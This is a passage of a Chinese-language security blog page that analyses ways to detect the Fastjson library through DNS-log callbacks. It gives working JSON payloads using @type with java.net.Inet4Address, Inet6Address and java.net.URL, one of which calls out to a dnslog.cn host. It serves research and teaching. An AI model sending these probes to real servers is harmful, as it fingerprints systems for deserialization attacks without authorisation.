<pre><code class="lang-json">{<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>}
</code></pre>
<p>&#x6700;&#x540E;&#x89E3;&#x6790;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E00;&#x6837;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;<code>InetAddress.getByName(strVal)</code></p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020151533802.png" data-lightbox="edc87d4e-441a-4f46-8b6f-be2a47468f0a" data-title="image-20211020151533802"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020151533802.png" alt="image-20211020151533802"></a></p>
<p>&#x6700;&#x7EC8;POC</p>
<pre><code class="lang-json">{<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>}
</code></pre>
<h3 id="javanetinet6address"><a name="javanetinet6address" class="anchor-navigation-ex-anchor" href="#javanetinet6address"><i class="fa fa-link" aria-hidden="true"></i></a>1.4.3. java.net.Inet6Address</h3>
<p>&#x770B;&#x4E86;&#x4E0B;&#xFF0C;&#x548C; java.net.Inet4Address &#x4E00;&#x6837;&#xFF0C;&#x5C31;&#x4E0D;&#x518D;&#x5199;&#x4E86;</p>
<pre><code class="lang-json">{<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet6Address&quot;</span>, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>}
</code></pre>
<h3 id="javaneturl"><a name="javaneturl" class="anchor-navigation-ex-anchor" href="#javaneturl"><i class="fa fa-link" aria-hidden="true"></i></a>1.4.4. java.net.URL</h3>
<p>&#x8FD9;&#x4E2A;&#x5C31;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x6765;&#x786C;&#x7684;&#x4E86;&#xFF0C;&#x6839;&#x636E;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x5206;&#x6790;&#x8FC7;&#x7684;<code>ysoserial#URLDNS</code>&#x8FD9;&#x6761;&#x94FE;&#xFF0C;&#x5982;&#x679C;&#x5C06;&#x4E00;&#x4E2A;URL&#x5BF9;&#x8C61;&#x653E;&#x7F6E;&#x5230;<code>HashMap</code>&#x4E2D;&#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x8FDB;&#x884C;&#x8BA1;&#x7B97;<code>hashcode</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x89E6;&#x53D1;dnslog&#x8BF7;&#x6C42;</p>
<p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x8BA9;fastjson&#x7ED9;&#x5BF9;&#x8C61;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E3A;<code>URL</code>&#x5BF9;&#x8C61;&#x7684;&#x540E;&#xFF0C;&#x518D;&#x628A;&#x5B83;&#x653E;&#x5230;HashMap&#x4E2D;&#x5373;&#x53EF;</p>
<pre><code class="lang-json">{{<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;http://8fhj7r.dnslog.cn&quot;</span>}:<span class="hljs-string">&quot;a&quot;</span>}
</code></pre>
<p>&#x4E0B;&#x65AD;&#x70B9;&#x5206;&#x6790;&#xFF0C;fastjson&#x7ED9;&#x524D;&#x9762;&#x8FD8;&#x539F;&#x6210;&#x4E86;<code>URL</code>&#x5BF9;&#x8C61;&#xFF0C;&#x5F53;&#x505A;&#x4E86;key</p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020162302812.png" data-lightbox="f139952e-d043-401c-a2eb-aa1bea18cdcd" data-title="image-20211020162302812"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020162302812.png" alt="image-20211020162302812"></a></p>
<p>&#x7136;&#x540E;&#x7EE7;&#x7EED;&#x8DDF;&#xFF0C;&#x53D1;&#x73B0;&#x4F7F;&#x7528;put&#x5C06;&#x5176;&#x6DFB;&#x52A0;&#x5230;HashMap&#x4E2D;&#xFF0C;&#x6240;&#x4EE5;dnslog&#x6536;&#x5230;&#x4E86;&#x8BF7;&#x6C42;</p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020162518225.png" data-lightbox="f4918fcb-efba-47d4-927c-55de08540b25" data-title="image-20211020162518225"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020162518225.png" alt="image-20211020162518225"></a></p>
<h3 id="javaneturi"><a name="javaneturi" class="anchor-navigation-ex-anchor" href="#javaneturi"><i class="fa fa-link" aria-hidden="true"></i></a>1.4.5. java.net.URI</h3>
<ol>
<li>&#x4E0D;&#x80FD;&#x548C;URL&#x7C7B;&#x7C7B;&#x4F3C;&#x4F3C;&#x4F7F;&#x7528;HashMap&#x8BA1;&#x7B97;key&#x7684;hashCode&#x65B9;&#x6CD5;&#x53BB;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;</li>
<li>&#x5185;&#x90E8;&#x4E5F;&#x6CA1;&#x6709;&#x7C7B;&#x4F3C;&#x7684;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#x7684;&#x65B9;&#x6CD5;</li>
</ol>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020163853356.png" data-lightbox="d1698020-c0d6-4dbe-93a1-6125e0866bbb" data-title="image-20211020163853356"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020163853356.png" alt="image-20211020163853356"></a></p>
<p>&#x6240;&#x4EE5;&#x76EE;&#x524D;&#x6CA1;&#x627E;&#x5230;&#x5229;&#x7528;&#x65B9;&#x6CD5;emmmmm</p>
<h2 id="&#x603B;&#x7ED3;"><a name="&#x603B;&#x7ED3;" class="anchor-navigation-ex-anchor" href="#&#x603B;&#x7ED3;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5. &#x603B;&#x7ED3;</h2>
<p>&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x7578;&#x5F62;&#x7684;payload&#xFF0C;&#x53EF;&#x4EE5;&#x53BB;<a href="#&#x524D;&#x8A00;">&#x524D;&#x8A00;</a>&#x91CC;&#x9762;&#x770B;&#x770B;issue&#xFF0C;&#x539F;&#x7406;&#x90FD;&#x5DEE;&#x4E0D;&#x591A;</p>
<p>&#x53EA;&#x662F;&#x5927;&#x4F6C;&#x4EEC;&#x5BF9;fastjson&#x7684;&#x89E3;&#x6790;&#x6D41;&#x7A0B;&#x771F;&#x7684;&#x7406;&#x89E3;&#x592A;&#x900F;&#x5F7B;&#x4E86;&#xFF0C;&#x7FA1;&#x6155;&#x4E86;</p>
<h2 id="&#x53C2;&#x8003;&#x6587;&#x732E;"><a name="&#x53C2;&#x8003;&#x6587;&#x732E;" class="anchor-navigation-ex-anchor" href="#&#x53C2;&#x8003;&#x6587;&#x732E;"><i class="fa fa-link" aria-hidden="true"></i></a>1.6. &#x53C2;&#x8003;&#x6587;&#x732E;</h2>
<ul>
<li><a href="https://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/" target="_blank">&#x901A;&#x8FC7;dnslog&#x63A2;&#x6D4B;fastjson&#x7684;&#x51E0;&#x79CD;&#x65B9;&#x6CD5;</a></li>
</ul>
<footer class="page-footer"><span class="copyright">Copyright &#xA9; d4m1ts 2022 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x8BE5;&#x6587;&#x7AE0;&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
2021-11-17 08:42:00
</span></footer></body></html>
                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="04.Fastjson 1.2.24反序列化漏洞分析.html" class="navigation navigation-prev " aria-label="Previous page: 04.Fastjson 1.2.24反序列化漏洞分析">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="06.Fastjson各版本漏洞分析.html" class="navigation navigation-next " aria-label="Next page: 06.Fastjson各版本漏洞分析">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"05.Fastjson的dnslog探测方式分析","level":"1.2.1.2.5","depth":4,"next":{"title":"06.Fastjson各版本漏洞分析","level":"1.2.1.2.6","depth":4,"path":"个人知识库/02.代码审计/01.Java安全/2.各种分析/06.Fastjson各版本漏洞分析.md","ref":"个人知识库/02.代码审计/01.Java安全/2.各种分析/06.Fastjson各版本漏洞分析.md","articles":[]},"previous":{"title":"04.Fastjson 1.2.24反序列化漏洞分析","level":"1.2.1.2.4","depth":4,"path":"个人知识库/02.代码审计/01.Java安全/2.各种分析/04.Fastjson 1.2.24反序列化漏洞分析.md","ref":"个人知识库/02.代码审计/01.Java安全/2.各种分析/04.Fastjson 1.2.24反序列化漏洞分析.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","highlight","chapter-fold","expandable-chapters","splitter","page-treeview","lightbox","donate","back-to-top-button","hide-element","code","tbfed-pagefooter","pageview-count","ancre-navigation","anchor-navigation-ex","insert-logo","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright &copy d4m1ts 2022","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"page-treeview":{"collapsed":false,"copyright":"Copyright &#169; d4m1ts","minHeaderCount":"2","minHeaderDeep":"2"},"chapter-fold":{},"livereload":{},"splitter":{},"code":{"copyButtons":true},"donate":{"alipay":"https://static01.imgkr.com/temp/7d293344052647ec8400657bb66cffc7.jpg","alipayText":"支付宝打赏","button":"支持","title":"Buy Me a Coffee\n","wechat":"https://static01.imgkr.com/temp/2316e058462948098c87dadf1f2b5d34.jpg","wechatText":"微信打赏"},"hide-element":{"elements":[".gitbook-link",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"lightbox":{"jquery":true,"sameUuid":false},"back-to-top-button":{},"pageview-count":{},"ancre-navigation":{"associatedWithSummary":true,"float":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showLevel":true},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"insert-logo":{"style":"background: none; max-height: 30px; min-height: 30px","url":"/README.assets/logo.png"},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"d4m1ts","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"d4m1ts's知识库","gitbook":"*","theme-default":{"showLevel":true}},"file":{"path":"个人知识库/02.代码审计/01.Java安全/2.各种分析/05.Fastjson的dnslog探测方式分析.md","mtime":"2021-11-17T00:42:00.523Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-12-25T10:50:10.533Z"},"basePath":"../../../..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../../../../gitbook/gitbook.js"></script>
    <script src="../../../../gitbook/theme.js"></script>
    
        
        <script src="../../../../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-search-plus/search.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-donate/plugin.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-hide-element/plugin.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-code/plugin.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-insert-logo/plugin.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

